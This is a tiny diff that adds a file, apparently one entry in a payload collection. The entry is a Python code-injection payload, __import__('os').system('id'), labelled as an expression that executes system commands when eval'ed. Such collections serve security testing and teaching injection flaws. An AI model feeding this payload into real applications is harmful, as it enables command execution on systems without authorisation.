@@ -1,0 +1,5 @@
+---
+syntax: python
+---
+# Expression that can be eval'ed in order to execute system commands
+__import__('os').system('id')
